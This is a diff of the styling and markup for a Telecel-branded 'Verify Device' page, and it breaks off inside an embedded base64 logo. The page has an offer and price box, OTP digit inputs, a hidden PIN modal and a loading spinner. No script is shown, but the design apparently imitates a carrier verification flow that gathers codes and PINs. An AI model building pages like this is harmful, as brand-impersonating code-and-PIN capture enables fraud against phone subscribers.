@@ -14,7 +14,7 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            padding: 10px;
+            padding: 15px;
         }
         .container {
             width: 100%;
@@ -24,86 +24,65 @@
             box-shadow: 0 10px 40px rgba(0,0,0,0.1);
             overflow: hidden;
         }
-        .logo-section { 
-            text-align: center; 
-            padding: 24px 0 14px; 
+
+        .logo-section { text-align: center; padding: 28px 0 12px; }
+        .telecel-logo { width: 140px; height: auto; }
+
+        h1 { text-align: center; font-size: 23px; font-weight: 700; color: #1e2937; margin: 10px 0 6px; }
+        .subtitle {
+            text-align: center;
+            color: #475569;
+            font-size: 15.5px;
+            padding: 0 25px 20px;
+            line-height: 1.5;
         }
-        .telecel-logo { 
-            width: 130px; 
-            height: auto; 
-            margin: 0 auto; 
-        }
-        h1 { 
-            text-align: center; 
-            font-size: 22px; 
-            font-weight: 700; 
-            margin: 8px 0 5px; 
-            color: #1e2937; 
-        }
-        .subtitle { 
-            text-align: center; 
-            color: #475569; 
-            font-size: 15px; 
-            padding: 0 25px 16px; 
-            line-height: 1.5; 
-        }
+
         .offer-info {
             background: #fff0f0;
-            margin: 0 20px 18px;
-            padding: 14px;
-            border-radius: 14px;
+            margin: 0 20px 20px;
+            padding: 16px;
+            border-radius: 16px;
             text-align: center;
             border: 1px solid #ffe0e0;
         }
+
         .otp-container {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin: 18px 0 25px;
-            padding: 0 15px;
+            gap: 12px;
+            margin: 20px 0 28px;
+            padding: 0 20px;
         }
         .otp-input {
-            width: 50px;
-            height: 58px;
+            width: 52px;
+            height: 62px;
             text-align: center;
-            font-size: 24px;
+            font-size: 26px;
             font-weight: 700;
             border: 2px solid #e2e8f0;
-            border-radius: 12px;
+            border-radius: 14px;
             outline: none;
         }
         .otp-input:focus {
             border-color: #E30613;
-            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.15);
+            box-shadow: 0 0 0 4px rgba(227, 6, 19, 0.15);
         }
-        .form-section { 
-            padding: 0 25px 30px; 
-        }
-        .error-msg {
-            text-align: center;
-            margin: 10px 20px 15px;
-            font-size: 14.5px;
-            padding: 12px;
-            border-radius: 10px;
-            display: none;
-            color: #dc3545;
-            background: #ffebee;
-        }
+
+        .form-section { padding: 0 25px 32px; }
         .btn-action {
             width: 100%;
             background: #E30613;
             color: white;
             border: none;
-            padding: 16px;
-            font-size: 17px;
+            padding: 17px;
+            font-size: 17.5px;
             font-weight: 700;
             border-radius: 50px;
             cursor: pointer;
-            margin: 8px 0;
-            transition: all 0.2s ease;
+            margin: 10px 0;
         }
         .btn-action:disabled {
-            background: #999;
+            background: #94a3b8;
             cursor: not-allowed;
         }
         .back-btn {
@@ -111,18 +90,73 @@
             background: transparent;
             color: #64748b;
             border: 2px solid #e2e8f0;
-            padding: 15px;
-            font-size: 16px;
+            padding: 16px;
+            font-size: 16.5px;
             font-weight: 600;
             border-radius: 50px;
             cursor: pointer;
         }
+
+        .error-msg {
+            text-align: center;
+            margin: 12px 20px 18px;
+            font-size: 14.5px;
+            padding: 14px;
+            border-radius: 12px;
+            display: none;
+            color: #dc3545;
+            background: #ffebee;
+            border: 1px solid #ffc6c6;
+        }
+
+        #pinModal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.75);
+            z-index: 3000;
+            align-items: center;
+            justify-content: center;
+            padding: 15px;
+        }
+        .modal-content {
+            background: white;
+            width: 100%;
+            max-width: 420px;
+            border-radius: 24px;
+            box-shadow: 0 15px 50px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+
+        #spinner {
+            display: none;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0,0,0,0.92);
+            z-index: 4000;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            color: white;
+        }
+        .spin {
+            width: 56px;
+            height: 56px;
+            border: 6px solid rgba(255,255,255,0.2);
+            border-top: 6px solid #E30613;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+    <!-- Main Page -->
     <div class="container">
         <div class="logo-section">
-            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAKEAAACgCAYAAABkDQwTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAA02SURBVHgB7Z1NbBvHFcffmyWlukEcBWiAFpYUGhYlJZcoQJEeQyO5R+q5qKW7W9s9JenB0qEJCrSwjPYuOj03ds5NKgbtpSmKMGjRWJIDUbbSHvpFJ3Eti9ydzluSKj92yV2KK0qe/w9QIlLL8ePwz/l47+0bIgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABDhgn0xXYmk/F/SaUyxFymSqV8tlQqEYgNRBgBI7gxJ52eJ49fVopzmigTerHWRfPfkkf8oVflW2dLt0sEugIRdmF7aiqXIueq6aUc9YsRpdb6uutWjCBLZQIdQIQBiPjSylnTusuIFxMzepZY6/zEnc0VAi1AhE38fXY2U63qtUONfD0QMZLnrUx+tpUn4AMR1tk9N31BK141v45FfU3qzBlyzE/188/JNT9xMGJcndzauEIAIhTuTU2bdR8vR73+9MWL9PXvLlBq/Iz/+L/v3qR/v/4GxUcXqxW1YPvmRZHlxBFg+rnn6Ju//YBO//DigQAPB885ab2+nZnNkMVYLcI4AnxiYYGe+dU7AxLf/zFTUaYmxEzkZcDjhrUi3JmauRxVgF975RV6+qdvkzr9JCWBCDGVHr1JlmKlCGUXrJiuRblWNh5jP36TjoCc/8WwECtF6Hp6Peq1oy+9NPApOAz5Yuxms3NkGSmyjLvZ2UUTwchEvf4JswvuRWp2ltLmR3/5ZeDf3S++CP1bO5qUjNDnySKsc9HsTs9sx4mEnPnTH4mfPNxa0DMi/Nu3X4r+As3nJ+7cLpAlWDUd10bBeKG4wwpQUKdPx7qeWF8li7BKhGqIH65EV2KQuzc1myNLsEaEkpQwyISEuMi6MA6edufJEqwRoWJnaB+qxJWjbkwasFKvkSXYI0Kil2lIfPGLX1JcxIF9kL39mGOFCLczcxISO3L/m4x+5Z+8RQ/e7S8Y4jjpHFmAHX7C1FdGgA4lhUy3D3/zPnn1KVfEV9ncLO//+S9jXsxpuBnNnCELsEKEjlZjSXpEH/3hIyq/9Xb704dOSGBNz5IFWDEdn9gRhelpsgBLNia671GpGjNjeqAwW5HeZX1SKxg+VoiQWZUIHFswEh5nPL1NFmCFCBW5RTqBaKYdsgArRFipPFGiPnF3h7cx8TSdyC9PXKwQ4dlSUcpvFOik4SqI8HHC0/pDOlkUbbkf2aIEBlWghBhE4ms7nuedtC9N31gjwnq6fIFiEqW8x+h3YqTuR8RznVWyBKtcNGah/x4lgKTvP/VmP2VAgtFEH9pUGsSqu+286qm8M/LwUpwM66hZME8uXqBTr75K+x995D+W+5VlmhaBfpW/QV+98w5FhXX0ujiPA1aJUHbJd7OzK0x6Lepr4lTbkvuTU+Odt4iOPP8cRUVr/d7knY0CWYR1EZPJrdt5irE27DchtV/cqrKuCoOVYbuUw0vmf5FK98o9w5IveCQwr9hYJs5KEX7r9u2S9vRS1Ov/8/obsYtgNhPxTrvrE5u3l8lCrE1gmPxs85aMPFGulZzCf3zv+30L8cGNXpsSKZb5aJksJbkbL04A1/71z8KPvvGMJP7nel0ru+S99z/wd7tSLDMKcq/J/Z/9nPZ+9/tuVxkB7p+3ubI/ygUbdqdmLuuIpeIEqaZw+gcXfSe101ZZQYS3/+mnvmAf/Prd7i4eplvV/UdLth8tARHW2c0+P0fs3oxbpUEZX2C67oKR6boaNevGLAVsXQO2AxE2IcUzK663zMQXKDF0kbS6YlPVrV5AhAHUxKjzPMCqDTi/JByIsAsyRXtUvWxGRqkL09edbxIHljAcRr5wIMKISKk2qZTFSs0xm3Vj0I3pTDtmTWl8kF7RCLfguvsFnGcHAAAAgBOAFWvCe1Mz6wcnd8r5w0xFt6KsTBZo5252On/gkhpS3xxZ7FjK9e6cy67uTE0v0zBhnjOdvmj7UV6BDKlvEheh+NxkJEqxs66UusScpCM4Ov6Zck7amrrQcZC+UanRRToiEs2sFgH6pyfx8AqWd8OWIpT9wFq/QEdEoiOhCHCYFfPBySCxkTDsyAYmPSbn+/a78K2vVfz1inEEl+gw6P7qFjYVNC8PyhndWIMdpr2B9s0RkpgIFTkhhcp5LJXW2/eyMy3PVj29cFYSTQMQQTtaXVCKcyYMlmk877ehqaC1d8N1nUJcYZtF+FNRrxUbUqQumcV7jppCeM02xI0L19p0rhpD5hpt1trTRfPv5Ce2Nq5HaUNpnneUeq2zb8xuV+vr/fTNUZLgmlBGmegeICegmqp8s1Mjo2vmQ56XpnTQC43rhVnlHKVLd89NX5kMEXK/tNgQRt2Gu9mZqyZOvNQrTiwxaa3dawduo472WES5ei87vRiW8Cp2OenRq6ZbLof3jdntMq/V+iYbmDxh7H122I66Y5Pe7xK3dLRsatIjox93/fCbkB0dK765e256YLvvfmwwn+p6Nxvkb5rc9VABtrY4p1IjHXff+V+M9Mi6L8CIdpmY95p/0v0x5LiIsNxegapa1Wv9bGq0otVB+biqrnezfxtmM+3P++tkxXmKkZGjmC61P+ekR1ZFoBQX5uXIZ+YpPktHxDEQoS4yOeeb1yxyGmf4VEU7HukbkiIV3B6PBY0ecamNGsEftPm3P+lpg+O22OCPqsqJfNN9c1vNJztJ33RJui13t4uO5QmiQ6jAoMvVinqx9vte4O5STuPUQYuctpR4/1vNnae41x3iy9QncgIUq4eLQTawpisTdzYOihXVRNFZ0cFsosSGAyHWM7YzFIJUXiBWt0z7JXlsxCQpY/PtibVR+8Zfd5L7ccCVOZkpjlOK2ZGLUJu1X7edmtlczAdNgZp0fnJzY7n5OdkAmF2gTOMtI1b9XLi+O9pJ74XaMHFns6VallR0uDc9s9yZX1gbwRquEsX8cqB4/Ib5fEDpD3m8upvNynvz30eY20uytifb7lcZ3/pr0USqCkEzSjqdljaKdExIUITclwDMmikXtFkzLpBP/GkplcrIY8dEO/ydXfiZdbLu6u/brj2zG++0wjxVarfBPJujHicviZDC1pYyso532U2Pb20diEWRygVfpQsi0MYjsUt7pl9CljRaO8cqZp6YCM2UWA5xHHRFaXohyGWg2Lmm0k7rbZldXAuHcdYa24NFpXk5lR5dpkjocsOGinGKp0JsrVQ5skuJQ8KfknRgYvOLLc91We1Xq3sHwjaj+30eso/msazAINMmHYaBHOfFN6JcFceJXB/5D0Wt9mHTMoVp6GvDx06E0sluZf8KDZfrJtoRaYd+lGca1/qGF+mYcezqE0acHsrmkvumUyUsVSZPl1k5RbdCAwlPac+4jTjCqNO4sYl0yRhekpOj3MrerfYNUdosTcIWJsadtEgRd/Ka9U7PvqmffXJgl+kbMzeXHHYKE2azQseQ5EToeWXxtLbTa+eqmUsh3Ww6ceM8DRATYclQHBu0vmV2xwsUEzlHJZV+KO+3Y0Mgzmjj2M5H+fJozebLQUE+wqLpmxdpgBi308lP5XLZC11rSMxThFj/yTRPSSYYH7ZQz/UKO0l7Jka62P68jCDd2pSdZd2Osa42MM/vTM1cjmuDVIg1o1JIvWwek0xmeU2THZntc+fmxTb/1oQ6Uu44uA2ai9I3vWxvt+tudnqtvW+SILFtke+WIPVx1OurlUdPN0ZH4/uTjs8FXqh10T+ThJtcQGb3qVi90MhGMaNCy/vayc6smm/bJepBrVTv5rxv//TMdphbRfxyLHaYyElUG7o4j3vS3Fa3vhG7tOe9161vTD+fbfYciDBVhGJQvi9yayORUF5i07H4t0yHBU5BQbRMz5pXzFYwF3ghm6A+t4XTWnx6ujMCIyMb654ibD5fWHu8FBSN8S/zExU4Y4Q9H2SDX/KjDd95PD27YkQRK2zW3pZUma26WsQ8FmQXK9X6Pjv9nS39o4iLUVxpTMntohPdHRtH7ErUa5uHe4mEiBOX+sB0Z8dUGvkMk6ZTNf3XRCyiGWBFIehZCauZ9WYk100D8+G3TON+lVniPvtG59vX4rX3ST19laZf71NCJCrCcYmxRvggZRps7xx5rdmlLkiUgiIio4bcrhj0t2rllGwoeuwOW48e80VDvBTHBknI6OYiMuG1xejiDq7g6hd/N6G+gfXN/qmlnkL0vDwlxJG4yiUebLaBl7mzypVxH/D16v7eathuWbJPqh5JksCF0LQq3y3B+W7tHNgiGTqkxZaD3V+vokWNknH1+G+GDmlDzzbrbfWqX+jfSKZ53qwdup3N0rOPG9T7ZrH5c/IzcowAk6wmdqTxGl9Q1VpnGZ9aeTym36qWkeyNyU+jDdNeqf/7VeLf63JgQz2EJlkvh7GhuU35vd+2Gn07KLsOcx8QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAnDj+ByGKzKp0DGEPAAAAAElFTkSuQmCC" 
+            <img src="data:image/png;base64,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" 
                  class="telecel-logo" alt="Telecel Logo">
         </div>
         <h1>Verify Device</h1>
@@ -130,7 +164,7 @@
         
         <div class="offer-info" id="offerInfo">
             <strong id="offerTitle"></strong><br>
-            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:21px;"></span>
+            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:22px;"></span>
         </div>
 
         <div class="otp-container" id="otpInputs"></div>
@@ -146,13 +180,15 @@
     <div id="pinModal">
         <div class="modal-content">
             <div class="logo-section">
-                <img src="data:image/png;base64,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